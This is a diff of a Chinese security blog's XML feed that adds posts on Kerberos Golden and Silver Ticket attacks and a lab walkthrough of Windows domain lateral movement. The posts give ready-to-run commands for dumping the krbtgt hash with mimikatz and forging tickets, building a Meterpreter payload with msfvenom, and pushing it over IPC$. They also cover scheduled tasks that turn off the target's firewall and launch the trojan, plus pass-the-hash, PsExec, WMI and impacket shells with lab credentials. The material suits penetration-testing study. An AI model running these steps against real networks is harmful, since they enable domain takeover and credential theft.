+<p>更详细的原理分析可以参考：<a href="https://blog.csdn.net/zy_strive_2012/article/details/51698780">ms14-068的深入分析</a></p>
+<h1 id="黄金票据">黄金票据</h1>
+<p><code>黄金票据（Golden  Ticket）</code>指黑客通过窃取Kerberos域控制器（KDC）的<code>krbtgt帐号的密码哈希值</code>,生成伪造的<code>票据（TGT）</code>来获取对整个Kerberos领域的完全访问权限的过程.这种攻击方式被称为“黄金”票据,因为它赋予了攻击者类似于使用黄金密钥一样的特权来绕过Kerberos的身份验证和授权机制,从而可以自由地访问所有资源,并且很难被检测到和防止.</p>
+<p>由于TGT部分是利用<code>krbtgt帐号的密码哈希</code>来加密的,KDC验证TGT是否有效也是用krbtgt帐号的密码哈希来解密,如果我们知道了krbtgt帐号的密码哈希,就可以自己伪造一个TGT了,而一般要得到krbtgt的密码哈希都是通过域控来拿的,所以黄金票据适合用来做<code>权限维持</code></p>
+<p>利用条件：<code>域名</code>、<code>域的sid</code>、<code>域的KRBTGT账户NTLM密码哈希</code>、<code>伪造对象用户名</code></p>
+<p>获取域名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+<p>获取sid：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure>
+<p>获取域的KRBTGT账户NTLM密码哈希或者aes-256值</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:xx.com /user:krbtgt /csv</span><br></pre></td></tr></table></figure>
+<p>查看域管理员用户名</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>
+<p>使用mimikatz</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">klist purge</span><br><span class="line"><span class="attr">kerberos</span>::golden  /<span class="attr">admin</span>:administrator  /<span class="attr">domain</span>:xx.<span class="property">com</span>  /<span class="attr">sid</span>:xxxx /<span class="attr">krbtgt</span>:xxxx  /ptt</span><br></pre></td></tr></table></figure>
+<p>参考：<a href="https://cloud.tencent.com/developer/article/2130133">一文了解黄金票据和白银票据</a></p>
+<h1 id="白银票据">白银票据</h1>
+<p><code>白银票据（Silver  Ticket）</code>指黑客通过窃取目标主机上的<code>服务账号的密码哈希值</code>,生成伪造的<code>服务票据（ST）</code>来获取对该主机上特定服务的访问权限.这种攻击方式被称为“白银”票据,因为它不像“黄金”票据那样具有完全的控制权限,只能用于访问特定的服务,并且难以被检测到和防止.</p>
+<p>与TGT类似,ST（Service Ticket）通过<code>服务账户的密码哈希</code>进行加密,如果我们知道了对应服务账户的密码哈希,我们就可以伪造该相关服务的ST,从而访问到该服务</p>
+<p>实操可参考：<a href="https://cloud.tencent.com/developer/article/1760135">白银票据（Silver Ticket）攻击</a></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>维权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>后渗透之横向移动</title>
+    <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
+    <content><![CDATA[<h1 id="环境">环境</h1>
+<p>已经拿下了一台域内win7的shell，同时获得了system权限<br>
+目标机是一台win2008，ip地址192.168.138.138</p>
+<h1 id="ipc连接">ipc连接</h1>
+<p>使用条件：<code>对方开启了139和445端口</code>&amp;&amp;<code>对方开启了默认共享</code><br>
+通过mimikatz在win7上拿到了域管理员Administrator的明文密码</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;Admin@123&quot; /user:Administrator</span><br></pre></td></tr></table></figure>
+<p>通过<code>net use</code>查看已经建立的ipc连接<br>
+<img src="59df3dbf616d4e9bbe97a20a5133463d.png" alt=""></p>
+<h1 id="计划任务">计划任务</h1>
+<p>思路是通过计划任务运行上传的木马文件从而拿shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#由于对方在内网，所以要通过正向连接的方式创建木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.138.138 LPORT=5555 -f exe &gt;f.exe</span><br><span class="line">#将木马复制到对方的c盘下</span><br><span class="line">copy f.exe \\192.168.138.138\c$</span><br><span class="line">#查看是否复制成功</span><br><span class="line">dir \\192.168.138.138\c$</span><br></pre></td></tr></table></figure>
+<p><img src="3c0619264b39461bab91b56ed157b44e.png" alt=""></p>
+<h2 id="at">at</h2>
+<p>首先要关闭对方的防火墙，否则正向连接会失败</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看对方当前时间</span></span><br><span class="line">net time \\192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建at计划任务来关闭防火墙</span></span><br><span class="line">at \\192.168.138.138 16:28  cmd.exe /c &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行木马</span></span><br><span class="line">at \\192.168.138.138 16:29 C:/f.exe</span><br></pre></td></tr></table></figure>
+<p>msf成功拿到shell<br>
+<img src="e4a7a521ead346c18b700c9b1fef59d2.png" alt=""></p>
+<blockquote>
+<p>注：at任务在运行结束以后会自动将计划列表里的任务删除</p>
+</blockquote>
+<h2 id="schtasks">schtasks</h2>
+<p>为了方便我们这里先将要执行的命令写到一个bat文件里，然后再运行bat文件</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell.bat</span></span><br><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">NetSh Advfirewall set allprofiles state off</span><br><span class="line">f.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy shell.bat \\192.168.138.138\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建计划任务</span></span><br><span class="line">schtasks  /create /s 192.168.138.138 /tn test /ru system /tr C:/shell.bat /sc daily /st 19:25</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">s表示要连接到的远程系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tn表示计划任务的名字</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ru表示运行计划任务的用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tr</span>表示计划运行文件的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sc表示“每”</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">st表示时间 /sc daily /st 19:25 表示 每天的19：25执行</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行计划任务</span></span><br><span class="line">schtasks  /run /s 192.168.138.138 /i /tn test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i表示忽略时间信息直接执行</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注：在使用schtasks的时候会留下日志文件C:/Windows/Tasks/SchedLgu.txt</p>
+</blockquote>
+<h1 id="哈希传递（PTH）">哈希传递（PTH）</h1>
+<p><code>哈希传递（Pass the Hash ）攻击</code>是一种利用 Windows 系统的身份验证机制漏洞的网络攻击方式。攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限（需要管理员权限）。<br>
+对于win2012以上的windows，或者win2002以下的打了KB2871997补丁的windows是读不了明文的，而这种攻击方式通常利用 Windows 系统中的 NTLM 身份认证协议，攻击者可以在未授权的情况下获取到用户的 NTLM 哈希值，并使用它来尝试登录目标系统，从而执行任意操作，甚至完全控制受攻击系统。</p>
+<p>这里为了演示，先打开win7的3389，再通过操纵win7打win2008<br>
+打开3389：<code>run post/windows/manage/enable_rdp</code><br>
+rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135.150   </code><br>
+<img src="511a3f8697d7446b9e34159807f16b1a.png" alt="">利用mimikatz拿到了域管理员的NTLM哈希<br>
+<img src="11629e84de7247ea87ce697ac35695be.png" alt=""><br>
+哈希传递：<code>sekurlsa::pth /user:administrator /domain:sun.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</code><br>
+此时会出现一个新的cmd窗口<br>
+同时我们可以通过<code>dir \\dc\c$</code>来看到域控主机c盘下的文件</p>
+<p><img src="ef06c69c50064b1e9f694213e67e6515.png" alt=""></p>
+<blockquote>
+<p>注：这里只能使用域控的名字而不能使用ip地址访问</p>
+</blockquote>
+<h1 id="票据传递（PTT）">票据传递（PTT）</h1>
+<p>票据传递攻击（Pass the Ticket Attack）是一种利用 Windows 系统的 Kerberos 身份验证协议漏洞的攻击方式。攻击者可以获取到受害者计算机上的 Kerberos 认证票据，并将其传递给其他系统，以获得访问权限。<br>
+将内存中的票据导出：<code>sekurlsa::tickets /export</code><br>
+可以看到出现了许多的票据文件<br>
+<img src="ded7f799fca6446db80a9fd666a5b859.png" alt=""><br>
+清除内存中的票据文件：<code> kerberos::purge</code><br>
+将票据文件注入内存：<br>
+<code> kerberos::ptt &quot;C:\Users\Administrator\Desktop\[0;53e35]-2-0-40e00000-Administrator@krbtgt-SUN.COM.kirbi</code><br>
+<img src="be4859a28dd54233a3175c8f21b01dbc.png" alt=""><br>
+同样可以查看域控的c盘文件<br>
+<img src="d471577d68794109bd7bd93fccecc0f1.png" alt=""></p>
+<blockquote>
+<p>区别：<br>
+票据传递攻击（Pass the Ticket Attack）和哈希传递攻击（Pass the Hash Attack）都是利用 Windows 系统中的身份验证机制漏洞的攻击方式。它们的区别在于攻击者<code>获取到的信息不同</code>。<br>
+票据传递攻击是基于 Kerberos 认证协议的攻击，攻击者通过获取到受害者计算机上的 <code>Kerberos 认证票据（TGT）</code>，并将其传递给其他系统来获得访问权限。<br>
+而哈希传递攻击则是基于 NTLM 身份认证协议的攻击，攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限。</p>
+</blockquote>
+<h1 id="PsExec">PsExec</h1>
+<p><code>PsExec</code>是一个由Sysinternals（现在属于微软）开发的免费实用程序，可以在本地或远程计算机上执行命令。它允许管理员在没有登录目标计算机的情况下，远程执行命令并获取结果。PsExec利用 Windows 系统中的网络共享和远程执行服务，通过远程调用进程、服务等方式来进行远程控制（需要提前下载）。<br>
+PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算机的系统目录中，同时在目标计算机上启动一个服务 (PSEXESVC)，该服务会等待来自 PsExec 的指令。PsExec 使用 Windows RPC（远程过程调用）协议与 PSEXESVC 通信，以向其发送要执行的命令。PSEXESVC 接收到命令后，会在目标计算机上启动相应的进程，并将结果返回给 PsExec。<br>
+在已经建立了ipc的情况下，可以直接通过psexec拿域控的system权限的shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sExec.exe -accepteula \\192.168.138.138 -s cmd.exe</span><br></pre></td></tr></table></figure>
+<p><img src="d9d529932e60460fb6d0134a9d56dfe7.png" alt=""><br>
+如果没有建立ipc也可以通过账户名和密码登录，但前提是该账户有<code>授权</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.138.138 -u Administrator -p  Admin@123 cmd.exe</span><br></pre></td></tr></table></figure>
+<p>这里没有授权所以失败了<br>
+<img src="b3fd7ddf7daa4c8597816f88cb930ac3.png" alt=""><br>
+同时msf中也带有psexec的攻击模块（要提前搭建内网路由） <code>exploit/windows/smb/psexec  </code><br>
+查看options<br>
+<img src="6710fda5114b4f859573d8a7888aef27.png" alt="">设置参数</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass Admin@123</span><br></pre></td></tr></table></figure>
+<p>成功拿到shell<br>
+<img src="0d06b94cf3744fd8bf6f82dcb3df3719.png" alt=""><br>
+在msf中使用psexec如果对方防火墙开着的话，就会连接失败<br>
+<img src="7fe56df5233f408db138f534a479876a.png" alt=""></p>
+<h1 id="WMI">WMI</h1>
+<p><code>WMI（Windows Management Instrumentation，Windows管理规范）</code>是一种由微软开发的系统管理技术，用于在Windows操作系统中收集和监控各种系统信息，以及执行系统管理任务。<br>
+<code>WMIC（Windows Management Instrumentation Command-Line，Windows管理规范命令行）</code>是一种基于WMI技术的命令行工具，用于在Windows操作系统中执行系统管理任务。通过WMIC命令行工具，管理员可以使用命令行界面来调用WMI接口，并执行各种管理任务，例如获取系统信息、配置系统参数、监控性能和事件等。WMIC命令行工具提供了丰富的命令选项和参数，支持多种数据格式和输出方式，适用于本地计算机和远程计算机上的管理任务。<br>
+在win7中输入</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.138.138 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="e7b0dd212a944905bf06a4bfbad8edd4.png" alt=""><br>
+win2008出现ip.txt说明命令成功执行<br>
+<img src="0acc7f885acb4e4e95fbf27d091bcc56.png" alt=""></p>
+<p>也可以通过impacket包（要下载）的wimexec来登录（实测有防火墙也能打）</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法：wmiexec.py user:pass@ip</span>  </span><br><span class="line">proxychains wmiexec.py administrator:Admin@123@192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">proxychains 是因为目标在内网开了代理</span></span><br></pre></td></tr></table></figure>
+<p><img src="3e6af64105484320825ab49b2f78cc0f.png" alt=""></p>
+<h1 id="SMB">SMB</h1>
+<p><code>SMB（Server Message Block，服务器消息块）</code>是一种用于文件和打印机共享的网络协议，通过SMB协议，客户端可以与远程计算机上的共享资源进行通信和交互，例如读取或写入共享文件、访问共享打印机等。SMB协议基于客户端/服务器模型，其中客户端向SMB服务器发送请求，并在响应中获取所需的数据。<br>
+<code>SMBexec</code>是一种基于SMB协议的渗透测试工具，利用SMB协议的漏洞和不安全配置与目标计算机进行通信和交互，以执行各种攻击任务。<br>
+impacket中有smbexec.py工具可以用来攻击<br>
+使用方法和wmiexec类似</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains smbexec.py Administrator:Admin@123@192.168.138.138   </span><br></pre></td></tr></table></figure>
+<p><img src="aa493e42938f4eb682654418fb32567b.png" alt=""></p>
+<h1 id="最后">最后</h1>
+<p>除此之外，还可以利用一些windows内核漏洞（例如永恒之蓝）去横向，就不多说了。<br>
+可以看到大多数的横向移动都是建立在拥有一个高权限用户和获取到明文密码的前提下的，所以前期的信息收集和权限提升步骤也不必可少。</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>横向</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>利用ipv6搭建一台服务器</title>
     <url>/post/%E5%88%A9%E7%94%A8ipv6%E6%90%AD%E5%BB%BA%E4%B8%80%E5%8F%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
     <content><![CDATA[<h3 id="背景">背景</h3>
@@ -1336,116 +1500,6 @@ InitialContext#lookup</p>
       </categories>
       <tags>
         <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>后渗透之横向移动</title>
-    <url>/post/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
-    <content><![CDATA[<h1 id="环境">环境</h1>
-<p>已经拿下了一台域内win7的shell，同时获得了system权限<br>
-目标机是一台win2008，ip地址192.168.138.138</p>
-<h1 id="ipc连接">ipc连接</h1>
-<p>使用条件：<code>对方开启了139和445端口</code>&amp;&amp;<code>对方开启了默认共享</code><br>
-通过mimikatz在win7上拿到了域管理员Administrator的明文密码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;Admin@123&quot; /user:Administrator</span><br></pre></td></tr></table></figure>
-<p>通过<code>net use</code>查看已经建立的ipc连接<br>
-<img src="59df3dbf616d4e9bbe97a20a5133463d.png" alt=""></p>
-<h1 id="计划任务">计划任务</h1>
-<p>思路是通过计划任务运行上传的木马文件从而拿shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#由于对方在内网，所以要通过正向连接的方式创建木马</span><br><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.138.138 LPORT=5555 -f exe &gt;f.exe</span><br><span class="line">#将木马复制到对方的c盘下</span><br><span class="line">copy f.exe \\192.168.138.138\c$</span><br><span class="line">#查看是否复制成功</span><br><span class="line">dir \\192.168.138.138\c$</span><br></pre></td></tr></table></figure>
-<p><img src="3c0619264b39461bab91b56ed157b44e.png" alt=""></p>
-<h2 id="at">at</h2>
-<p>首先要关闭对方的防火墙，否则正向连接会失败</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看对方当前时间</span></span><br><span class="line">net time \\192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建at计划任务来关闭防火墙</span></span><br><span class="line">at \\192.168.138.138 16:28  cmd.exe /c &quot;NetSh Advfirewall set allprofiles state off&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">运行木马</span></span><br><span class="line">at \\192.168.138.138 16:29 C:/f.exe</span><br></pre></td></tr></table></figure>
-<p>msf成功拿到shell<br>
-<img src="e4a7a521ead346c18b700c9b1fef59d2.png" alt=""></p>
-<blockquote>
-<p>注：at任务在运行结束以后会自动将计划列表里的任务删除</p>
-</blockquote>
-<h2 id="schtasks">schtasks</h2>
-<p>为了方便我们这里先将要执行的命令写到一个bat文件里，然后再运行bat文件</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">shell.bat</span></span><br><span class="line">@echo off</span><br><span class="line">c:</span><br><span class="line">NetSh Advfirewall set allprofiles state off</span><br><span class="line">f.exe</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">copy shell.bat \\192.168.138.138\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建计划任务</span></span><br><span class="line">schtasks  /create /s 192.168.138.138 /tn test /ru system /tr C:/shell.bat /sc daily /st 19:25</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">s表示要连接到的远程系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">tn表示计划任务的名字</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ru表示运行计划任务的用户</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">tr</span>表示计划运行文件的位置</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sc表示“每”</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">st表示时间 /sc daily /st 19:25 表示 每天的19：25执行</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行计划任务</span></span><br><span class="line">schtasks  /run /s 192.168.138.138 /i /tn test</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i表示忽略时间信息直接执行</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>注：在使用schtasks的时候会留下日志文件C:/Windows/Tasks/SchedLgu.txt</p>
-</blockquote>
-<h1 id="哈希传递（PTH）">哈希传递（PTH）</h1>
-<p><code>哈希传递（Pass the Hash ）攻击</code>是一种利用 Windows 系统的身份验证机制漏洞的网络攻击方式。攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限（需要管理员权限）。<br>
-对于win2012以上的windows，或者win2002以下的打了KB2871997补丁的windows是读不了明文的，而这种攻击方式通常利用 Windows 系统中的 NTLM 身份认证协议，攻击者可以在未授权的情况下获取到用户的 NTLM 哈希值，并使用它来尝试登录目标系统，从而执行任意操作，甚至完全控制受攻击系统。</p>
-<p>这里为了演示，先打开win7的3389，再通过操纵win7打win2008<br>
-打开3389：<code>run post/windows/manage/enable_rdp</code><br>
-rdesktop连接：<code>rdesktop -u Administrator -p Admin@123 -d sun 192.168.135.150   </code><br>
-<img src="511a3f8697d7446b9e34159807f16b1a.png" alt="">利用mimikatz拿到了域管理员的NTLM哈希<br>
-<img src="11629e84de7247ea87ce697ac35695be.png" alt=""><br>
-哈希传递：<code>sekurlsa::pth /user:administrator /domain:sun.com /ntlm:570a9a65db8fba761c1008a51d4c95ab</code><br>
-此时会出现一个新的cmd窗口<br>
-同时我们可以通过<code>dir \\dc\c$</code>来看到域控主机c盘下的文件</p>
-<p><img src="ef06c69c50064b1e9f694213e67e6515.png" alt=""></p>
-<blockquote>
-<p>注：这里只能使用域控的名字而不能使用ip地址访问</p>
-</blockquote>
-<h1 id="票据传递（PTT）">票据传递（PTT）</h1>
-<p>票据传递攻击（Pass the Ticket Attack）是一种利用 Windows 系统的 Kerberos 身份验证协议漏洞的攻击方式。攻击者可以获取到受害者计算机上的 Kerberos 认证票据，并将其传递给其他系统，以获得访问权限。<br>
-将内存中的票据导出：<code>sekurlsa::tickets /export</code><br>
-可以看到出现了许多的票据文件<br>
-<img src="ded7f799fca6446db80a9fd666a5b859.png" alt=""><br>
-清除内存中的票据文件：<code> kerberos::purge</code><br>
-将票据文件注入内存：<br>
-<code> kerberos::ptt &quot;C:\Users\Administrator\Desktop\[0;53e35]-2-0-40e00000-Administrator@krbtgt-SUN.COM.kirbi</code><br>
-<img src="be4859a28dd54233a3175c8f21b01dbc.png" alt=""><br>
-同样可以查看域控的c盘文件<br>
-<img src="d471577d68794109bd7bd93fccecc0f1.png" alt=""></p>
-<blockquote>
-<p>区别：<br>
-票据传递攻击（Pass the Ticket Attack）和哈希传递攻击（Pass the Hash Attack）都是利用 Windows 系统中的身份验证机制漏洞的攻击方式。它们的区别在于攻击者<code>获取到的信息不同</code>。<br>
-票据传递攻击是基于 Kerberos 认证协议的攻击，攻击者通过获取到受害者计算机上的 <code>Kerberos 认证票据（TGT）</code>，并将其传递给其他系统来获得访问权限。<br>
-而哈希传递攻击则是基于 NTLM 身份认证协议的攻击，攻击者通过获取到<code>已经被哈希过的用户密码信息（而不是明文密码）</code>，然后将该信息直接传递给目标系统进行身份验证，从而绕过密码验证步骤来获得系统访问权限。</p>
-</blockquote>
-<h1 id="PsExec">PsExec</h1>
-<p><code>PsExec</code>是一个由Sysinternals（现在属于微软）开发的免费实用程序，可以在本地或远程计算机上执行命令。它允许管理员在没有登录目标计算机的情况下，远程执行命令并获取结果。PsExec利用 Windows 系统中的网络共享和远程执行服务，通过远程调用进程、服务等方式来进行远程控制（需要提前下载）。<br>
-PsExec 连接到目标计算机并将 PsExec 服务程序复制到目标计算机的系统目录中，同时在目标计算机上启动一个服务 (PSEXESVC)，该服务会等待来自 PsExec 的指令。PsExec 使用 Windows RPC（远程过程调用）协议与 PSEXESVC 通信，以向其发送要执行的命令。PSEXESVC 接收到命令后，会在目标计算机上启动相应的进程，并将结果返回给 PsExec。<br>
-在已经建立了ipc的情况下，可以直接通过psexec拿域控的system权限的shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sExec.exe -accepteula \\192.168.138.138 -s cmd.exe</span><br></pre></td></tr></table></figure>
-<p><img src="d9d529932e60460fb6d0134a9d56dfe7.png" alt=""><br>
-如果没有建立ipc也可以通过账户名和密码登录，但前提是该账户有<code>授权</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PsExec.exe -accepteula \\192.168.138.138 -u Administrator -p  Admin@123 cmd.exe</span><br></pre></td></tr></table></figure>
-<p>这里没有授权所以失败了<br>
-<img src="b3fd7ddf7daa4c8597816f88cb930ac3.png" alt=""><br>
-同时msf中也带有psexec的攻击模块（要提前搭建内网路由） <code>exploit/windows/smb/psexec  </code><br>
-查看options<br>
-<img src="6710fda5114b4f859573d8a7888aef27.png" alt="">设置参数</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line">set smbuser Administrator</span><br><span class="line">set smbpass Admin@123</span><br></pre></td></tr></table></figure>
-<p>成功拿到shell<br>
-<img src="0d06b94cf3744fd8bf6f82dcb3df3719.png" alt=""><br>
-在msf中使用psexec如果对方防火墙开着的话，就会连接失败<br>
-<img src="7fe56df5233f408db138f534a479876a.png" alt=""></p>
-<h1 id="WMI">WMI</h1>
-<p><code>WMI（Windows Management Instrumentation，Windows管理规范）</code>是一种由微软开发的系统管理技术，用于在Windows操作系统中收集和监控各种系统信息，以及执行系统管理任务。<br>
-<code>WMIC（Windows Management Instrumentation Command-Line，Windows管理规范命令行）</code>是一种基于WMI技术的命令行工具，用于在Windows操作系统中执行系统管理任务。通过WMIC命令行工具，管理员可以使用命令行界面来调用WMI接口，并执行各种管理任务，例如获取系统信息、配置系统参数、监控性能和事件等。WMIC命令行工具提供了丰富的命令选项和参数，支持多种数据格式和输出方式，适用于本地计算机和远程计算机上的管理任务。<br>
-在win7中输入</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wmic /node:192.168.138.138 /user:Administrator /password:Admin@123 process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="e7b0dd212a944905bf06a4bfbad8edd4.png" alt=""><br>
-win2008出现ip.txt说明命令成功执行<br>
-<img src="0acc7f885acb4e4e95fbf27d091bcc56.png" alt=""></p>
-<p>也可以通过impacket包（要下载）的wimexec来登录（实测有防火墙也能打）</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用法：wmiexec.py user:pass@ip</span>  </span><br><span class="line">proxychains wmiexec.py administrator:Admin@123@192.168.138.138 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">proxychains 是因为目标在内网开了代理</span></span><br></pre></td></tr></table></figure>
-<p><img src="3e6af64105484320825ab49b2f78cc0f.png" alt=""></p>
-<h1 id="SMB">SMB</h1>
-<p><code>SMB（Server Message Block，服务器消息块）</code>是一种用于文件和打印机共享的网络协议，通过SMB协议，客户端可以与远程计算机上的共享资源进行通信和交互，例如读取或写入共享文件、访问共享打印机等。SMB协议基于客户端/服务器模型，其中客户端向SMB服务器发送请求，并在响应中获取所需的数据。<br>
-<code>SMBexec</code>是一种基于SMB协议的渗透测试工具，利用SMB协议的漏洞和不安全配置与目标计算机进行通信和交互，以执行各种攻击任务。<br>
-impacket中有smbexec.py工具可以用来攻击<br>
-使用方法和wmiexec类似</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains smbexec.py Administrator:Admin@123@192.168.138.138   </span><br></pre></td></tr></table></figure>
-<p><img src="aa493e42938f4eb682654418fb32567b.png" alt=""></p>
-<h1 id="最后">最后</h1>
-<p>除此之外，还可以利用一些windows内核漏洞（例如永恒之蓝）去横向，就不多说了。<br>
-可以看到大多数的横向移动都是建立在拥有一个高权限用户和获取到明文密码的前提下的，所以前期的信息收集和权限提升步骤也不必可少。</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>横向</tag>
       </tags>
   </entry>
   <entry>
